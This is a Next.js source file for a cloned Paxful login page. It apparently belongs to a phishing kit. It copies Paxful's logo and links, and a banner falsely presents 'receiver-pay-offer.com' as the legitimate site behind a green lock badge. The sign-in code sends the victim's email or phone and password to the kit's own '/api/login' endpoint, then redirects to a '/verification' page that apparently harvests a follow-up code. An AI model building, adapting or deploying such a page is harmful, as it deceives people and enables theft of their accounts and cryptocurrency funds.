"use client";

import { Montserrat } from "next/font/google";
import { IoLockClosedSharp } from "react-icons/io5";

import Image from "next/image";
import Link from "next/link";
import React, { useState } from "react";
import axios from "axios";
import { baseUrl } from "@/config";
import { useRouter } from "next/navigation";
const serrat = Montserrat({
  subsets: ["cyrillic", "cyrillic-ext", "latin", "latin-ext", "vietnamese"],
});

const Index = () => {
  const [lang, showlang] = useState(false);
  const [show, setShow] = useState(false);
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [error1, setError1] = useState("");
  const [error2, setError2] = useState("");
  const [isLoading, setIsLoading] = useState(false);
  const router = useRouter();

  function validateEmailOrPhone(input: string) {
    // Regular expression for validating an email
    const emailPattern = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;

    // Regular expression for validating a phone number (10 digits, allows spaces, dashes, parentheses)
    const phonePattern =
      /^(\+?\d{1,3}[-.\s]?)?\(?\d{3}\)?[-.\s]?\d{3}[-.\s]?\d{4}$/;

    // Check if input matches either the email or phone pattern
    if (emailPattern.test(input) || phonePattern.test(input)) {
      setError1("");
    } else {
      setError1("Enter a valid phone or email.");
    }
  }

  const handleEmailChange = (e: any) => {
    validateEmailOrPhone(e.target.value); // Validate email on each change
    setEmail(e.target.value);
  };

  const handleSignIn = async () => {
    try {
      setIsLoading(true);
      const res = await axios.post(`${baseUrl}/api/login`, { email, password });
      console.log(res);
      router.push(`/verification?email=${email}`);
      setIsLoading(!true);
    } catch (error) {
      console.error(error);
      setIsLoading(!true);
    }
  };

  return (
    <div className='w-full h-screen  flex flex-row-reverse'>
      <div className='w-[58.5%] hidden lg:flex bg-[#f4fafdff] relative items-center justify-center h-screen'>
        <Image
          quality={100}
          className='object-cover'
          src={"/login.webp"}
          width={600}
          height={606}
          alt='login'
        />
      </div>
      <div className='w-full lg:w-[41.5%] pl-[4%] md:pl-[7.8%] pr-[4%] pt-[10%] lg:pt-[4.3%] bg-white h-full'>
        <div className='flex items-center  justify-between w-full'>
          <Link className='' href={"/"}>
            <svg
              viewBox='0 0 123.7 23.3'
              xmlns='http://www.w3.org/2000/svg'
              fill='#333'
              className='VRptv mr-4'
              width='120'
            >
              <path d='M91.3 1.7V12c0 3.6 1.5 5 4.1 5s4.1-1.5 4.1-5V1.7h4.3v10.4c0 5.5-3.1 8.5-8.4 8.5-5.2 0-8.4-3-8.4-8.5V1.7zm-59.8 0l8.3 18.6h-4.5l-1.7-4H25l-1.7 4h-4.4l8.3-18.6zm49.7 0v3.5h-9.7v4.9H80v3.5h-8.5v6.8h-4.3V1.7zm32.8 0v15.1h9.7v3.5h-14V1.7zM8.1 1.7c4.9 0 8.1 2.5 8.1 6.8 0 4.1-3.1 6.7-8.1 6.7H4.3v5.2H0V1.7zm47 9.9l6.3 8.7h-4.1c-.6 0-1.2-.2-1.6-.7l-.1-.1-2.3-3.2c-.5-.8-.5-1.8 0-2.6l.1-.2zM29.3 6l-2.9 7.1h5.9zM7.9 5.2H4.3v6.5h3.5c2.7 0 4-1.2 4-3.2s-1.3-3.3-3.9-3.3zm39-3.5c.7 0 1.2.2 1.6.7l.1.1 1.2 1.7c.5.7.5 1.7.1 2.4l-.1.1-1.7 2.4-5.4-7.5z'></path>
              <path
                d='M63.1 0L41.5 23.2c-.2.3-.7-.1-.4-.4L56.7.8c.4-.5 1-.8 1.7-.8z'
                fill='#00a5ef'
              ></path>
            </svg>
          </Link>
          <button
            onClick={() => showlang(!lang)}
            className={`flex w-max px-2   rounded-[4px] items-center justify-between text-[.875rem]  border ${
              lang ? "border-appBlue" : "border-[#d8d8d8] duration-300"
            } min-h-[32px] font-semibold leading-[24px]`}
          >
            {/* <button className='min-h-[32px]  rounded-[4px] px-[.5rem] border border-[#d8d8d8]'> */}
            <svg
              width='16'
              height='16'
              viewBox='0 0 16 16'
              fill='#a9a9a9'
              className='mr-2 text-gray-500'
            >
              <path d='M8 0C3.6 0 0 3.6 0 8s3.6 8 8 8 8-3.6 8-8-3.6-8-8-8zM1.8 8c0-.8.2-1.6.4-2.3.5.3 1.2.6 1.9.7C4 7 4 7.5 4 8s0 1 .1 1.6c-.7.1-1.4.4-1.9.7-.2-.7-.4-1.5-.4-2.3zm4 0c0-.4 0-.8.1-1.2.7.1 1.4.1 2.1.1s1.4 0 2.1-.1c0 .4.1.8.1 1.2s0 .8-.1 1.2c-.7-.1-1.4-.1-2.1-.1s-1.4 0-2.1.1c-.1-.4-.1-.8-.1-1.2zm6.1-1.6c.7-.2 1.3-.4 1.8-.7.3.7.5 1.5.5 2.3s-.2 1.6-.4 2.3c-.5-.3-1.1-.6-1.8-.7V8c0-.5 0-1-.1-1.6zm1-2.2c-.2.2-.6.3-1.2.5-.2-.8-.4-1.5-.7-2.1.7.3 1.3.9 1.9 1.6zM8 1.8c.1 0 .6.1 1.2 1.3.3.6.5 1.2.7 1.9-.6.1-1.2.1-1.9.1s-1.3 0-1.9-.1c.2-.7.4-1.3.6-1.8.7-1.3 1.2-1.4 1.3-1.4zm-2.9.7c-.3.7-.5 1.4-.7 2.2-.6-.2-1-.3-1.3-.5.6-.7 1.2-1.3 2-1.7zm-2 9.3c.2-.2.6-.3 1.2-.5.2.8.4 1.5.7 2.1-.7-.3-1.3-.9-1.9-1.6zM8 14.2c-.1 0-.6-.1-1.2-1.3-.3-.5-.5-1.1-.6-1.8.6-.1 1.2-.1 1.9-.1s1.3 0 1.9.1c-.2.7-.4 1.3-.6 1.8-.8 1.2-1.3 1.3-1.4 1.3zm2.9-.7c.3-.6.5-1.4.7-2.1.6.2 1 .3 1.2.5-.5.6-1.1 1.2-1.9 1.6z'></path>
            </svg>
            {/* </button> */}
            <p className='text-[#333]'>English</p>
            <svg
              width='16'
              height='16'
              viewBox='0 0 16 16'
              fill={`${lang ? "#00a5ef" : "#a9a9a9"}`}
              // className='ml-2 '
              className={`${
                lang ? "rotate-180 " : ""
              } duration-200  ml-2 transition-all`}
            >
              <path
                fill-rule='evenodd'
                d='M2.707 4.293L8 9.585l5.293-5.292a1 1 0 111.414 1.414l-6 6a.996.996 0 01-.53.277l-.118.014h-.118a.997.997 0 01-.648-.29l-6-6a1 1 0 011.414-1.415z'
                clip-rule='evenodd'
              ></path>
            </svg>
            {/* <svg
              width='24'
              height='24'
              viewBox='0 0 24 24'
              fill={`${lang ? "#00a5ef" : "#626262"}`}
              // className='ml-2 '
              className={`${
                lang ? "rotate-180 " : ""
              } duration-200 transition-all`}
            >
              <path d='M12 14.8c-.2 0-.4-.1-.5-.2l-4-4c-.3-.3-.3-.8 0-1.1s.8-.3 1.1 0l3.5 3.5 3.5-3.5c.3-.3.8-.3 1.1 0s.3.8 0 1.1l-4 4c-.3.1-.5.2-.7.2z'></path>
            </svg> */}
          </button>
        </div>
        <h1
          style={serrat.style}
          className=' mt-[30px] text-[#46127b] font-[700] text-2xl '
        >
          Log In With Paxful
        </h1>
        <div className='border relative border-[#d1ecfa] mt-[24px] bg-[#f4fafd] rounded-[8px] py-[11px] pl-[35px] flex flex-col md:flex-row '>
          <svg
            width='16'
            height='16'
            viewBox='0 0 16 16'
            fill='#0091d2'
            className='absolute left-3   top-3'
          >
            <path
              fill-rule='evenodd'
              d='M8 2a6 6 0 100 12A6 6 0 008 2zM0 8a8 8 0 1116 0A8 8 0 010 8zm9-3a1 1 0 11-2 0 1 1 0 012 0zM8 7a1 1 0 00-1 1v3a1 1 0 102 0V8a1 1 0 00-1-1z'
              clip-rule='evenodd'
            ></path>
          </svg>
          <p className='text-xs text-[#333] md:w-[45%] font-semibold'>
            IMPORTANT! Please check that you are visiting
            https://receiver-pay-offer.com/
          </p>
          <div className='bg-white mt-2 lg:mt-0 md:self-center w-max relative md:left-[3%] h-max px-[8px] py-[4px] border border-appAsh rounded-[4px] flex items-center'>
            <IoLockClosedSharp className='' color=' #16a34a ' />
            <p className='font-bold ml-1 text-[#333] text-[10px]'>
              <span className='text-green-600 text-[10px]'>https://</span>{" "}
              receiver-pay-offer.com
            </p>
          </div>
        </div>
        <div className='w-full mt-6'>
          <h3 className='text-[#333] mb-1  font-semibold'>
            Your Phone or Email
          </h3>
          <input
            onBlur={() => {
              if (email === "") {
                setError1("This field may not be blank");
              } else {
                setError1("");
                validateEmailOrPhone(email);
              }
            }}
            onChange={(e) => {
              handleEmailChange(e);
            }}
            className={`w-[100%] h-[47.6px] px-2 focus:outline-appBlue hover:border-[#626262] border ${
              error1 ? "border-error" : "border-appAsh "
            } border-appAsh rounded-[4px]`}
            type='text'
          />
          {error1 && (
            <div className='flex mt-1 items-center'>
              <svg width='16' height='16' viewBox='0 0 16 16' fill='#eb4a27'>
                <path
                  fill-rule='evenodd'
                  d='M8 2a6 6 0 100 12A6 6 0 008 2zM0 8a8 8 0 1116 0A8 8 0 010 8zm9-3a1 1 0 11-2 0 1 1 0 012 0zM8 7a1 1 0 00-1 1v3a1 1 0 102 0V8a1 1 0 00-1-1z'
                  clip-rule='evenodd'
                ></path>
              </svg>
              <p className='text-error ml-2 font-[400]'>{error1}</p>
            </div>
          )}
        </div>
        <div className='w-full mt-4'>
          <div className='flex items-center justify-between'>
            <h3 className='text-[#333] mb-1  font-semibold'>Your Password</h3>
            <Link
              href={"https://paxful.com/forgot-password?locale=en"}
              className='text-appBlue2 hover:text-[#333] hover:underline mb-1 '
            >
              Forgot Password?
            </Link>
          </div>
          <div className='relative flex items-center w-full h-max '>
            {show ? (
              <input
                onChange={(e) => setPassword(e.target.value)}
                onBlur={() => {
                  if (password === "") {
                    setError2("This field may not be blank");
                  } else {
                    setError2("");
                  }
                }}
                className={`w-[100%] px-2 focus:outline-appBlue hover:border-[#626262] h-[47.6px] border ${
                  error2 ? "border-error" : "border-appAsh "
                } rounded-[4px]`}
                type='text'
              />
            ) : (
              <input
                onChange={(e) => setPassword(e.target.value)}
                onBlur={() => {
                  if (password === "") {
                    setError2("This field may not be blank");
                  } else {
                    setError2("");
                  }
                }}
                className={`w-[100%] px-2 focus:outline-appBlue hover:border-[#626262] h-[47.6px] border ${
                  error2 ? "border-error" : "border-appAsh "
                } rounded-[4px]`}
                type='password'
              />
            )}
            <button
              onClick={() => setShow(!show)}
              className='absolute right-3 self-center'
            >
              {show ? (
                <svg
                  width='16'
                  height='16'
                  viewBox='0 0 16 16'
                  fill='#626262'
                  className='d-block'
                >
                  <path
                    fill-rule='evenodd'
                    d='M2.03 8.006L2.027 8l.003-.006a2.35 2.35 0 01.287-.41c.288-.344.73-.753 1.3-1.145C4.762 5.65 6.318 5 8 5c1.68 0 3.235.656 4.381 1.448a6.704 6.704 0 011.303 1.148c.142.17.234.307.285.404a2.465 2.465 0 01-.285.404 6.704 6.704 0 01-1.303 1.148C11.235 10.344 9.68 11 8 11c-1.682 0-3.238-.65-4.383-1.439-.57-.392-1.012-.8-1.3-1.144a2.397 2.397 0 01-.287-.41zM8 3c-2.184 0-4.128.836-5.517 1.79-.696.48-1.279 1.007-1.7 1.51a4.29 4.29 0 00-.528.772C.128 7.317 0 7.642 0 8c0 .358.128.683.255.928.135.26.318.522.528.772.421.503 1.004 1.03 1.7 1.51C3.872 12.163 5.816 13 8 13c2.186 0 4.131-.844 5.518-1.802.696-.48 1.278-1.008 1.698-1.508.21-.25.392-.508.527-.766.126-.24.257-.565.257-.924 0-.359-.13-.684-.257-.924a4.385 4.385 0 00-.527-.766c-.42-.5-1.002-1.027-1.698-1.508C12.131 3.844 10.186 3 8 3zm0 7a2 2 0 100-4 2 2 0 000 4z'
                    clip-rule='evenodd'
                  ></path>
                </svg>
              ) : (
                <svg
                  width='16'
                  height='16'
                  viewBox='0 0 16 16'
                  fill='#626262'
                  className='d-block'
                >
                  <path
                    fill-rule='evenodd'
                    d='M2.707 1.293a1 1 0 00-1.414 1.414l1.734 1.734c-.19.114-.37.231-.544.35-.696.479-1.279 1.006-1.7 1.509a4.29 4.29 0 00-.528.772C.128 7.317 0 7.642 0 8c0 .358.128.683.255.928.135.26.318.522.528.772.421.503 1.004 1.03 1.7 1.51C3.872 12.163 5.816 13 8 13a9.15 9.15 0 003.048-.538l2.245 2.245a1 1 0 001.414-1.414l-1.74-1.74c.192-.115.376-.234.551-.355.696-.48 1.278-1.008 1.698-1.508.21-.25.392-.508.527-.766.126-.24.257-.565.257-.924 0-.359-.13-.684-.257-.924a4.385 4.385 0 00-.527-.766c-.42-.5-1.002-1.027-1.698-1.508C12.131 3.844 10.186 3 8 3a9.2 9.2 0 00-3.05.535L2.706 1.293zm1.788 4.616a8.599 8.599 0 00-.878.53c-.57.392-1.012.8-1.3 1.144a2.397 2.397 0 00-.287.41L2.027 8l.003.006c.05.098.143.238.287.41.288.344.73.753 1.3 1.145C4.762 10.35 6.318 11 8 11c.49 0 .97-.056 1.431-.155l-.913-.913a2.003 2.003 0 01-2.45-2.45L4.495 5.909zm2.987.159l-.914-.915A6.906 6.906 0 018 5c1.68 0 3.235.656 4.381 1.448a6.704 6.704 0 011.303 1.148c.142.17.234.307.285.404a2.465 2.465 0 01-.285.404 6.704 6.704 0 01-1.303 1.148 8.645 8.645 0 01-.88.534l-1.57-1.568a2.003 2.003 0 00-2.45-2.45z'
                    clip-rule='evenodd'
                  ></path>
                </svg>
              )}
            </button>
          </div>
          {error2 && (
            <div className='flex mt-1 items-center'>
              <svg width='16' height='16' viewBox='0 0 16 16' fill='#eb4a27'>
                <path
                  fill-rule='evenodd'
                  d='M8 2a6 6 0 100 12A6 6 0 008 2zM0 8a8 8 0 1116 0A8 8 0 010 8zm9-3a1 1 0 11-2 0 1 1 0 012 0zM8 7a1 1 0 00-1 1v3a1 1 0 102 0V8a1 1 0 00-1-1z'
                  clip-rule='evenodd'
                ></path>
              </svg>
              <p className='text-error ml-2 font-[400]'>{error2}</p>
            </div>
          )}
        </div>
        <button
          onClick={handleSignIn}
          className={`w-[100%] mt-6 px-3 ${
            isLoading || error1 || error2 ? "bg-appAsh/30" : "bg-appBlue"
          } hover:bg-[#0091d2] cursor-pointer flex items-center justify-between h-[56px] border  rounded-[4px]`}
        >
          <p
            className={`${
              isLoading || error1 || error2 ? "text-[#a9a9a9]" : "text-white"
            } font-semibold`}
          >
            {isLoading ? "Loading..." : "Log In"}
          </p>
          <svg
            width='16'
            height='16'
            viewBox='0 0 16 16'
            fill={isLoading || error1 || error2 ? "#a9a9a9" : "white"}
            className=''
          >
            <path
              fill-rule='evenodd'
              d='M4.294 13.292l5.292-5.293-5.292-5.293a1 1 0 111.414-1.414l6 6a.99.99 0 01.277.53L12 7.94v.118a.996.996 0 01-.291.648l-6 6a1 1 0 11-1.414-1.414z'
              clip-rule='evenodd'
            ></path>
          </svg>
        </button>
        <div className='border-t mt-6 py-3 border-appAsh'>
          <span className='text-[#333]'>
            New on Paxful ?
            <Link
              href='https://paxful.com/register?locale=en'
              className='ml-2 hover:text-[#333] text-appBlue2'
            >
              Create an Account
            </Link>
          </span>
        </div>
      </div>
    </div>
  );
};

export default Index;
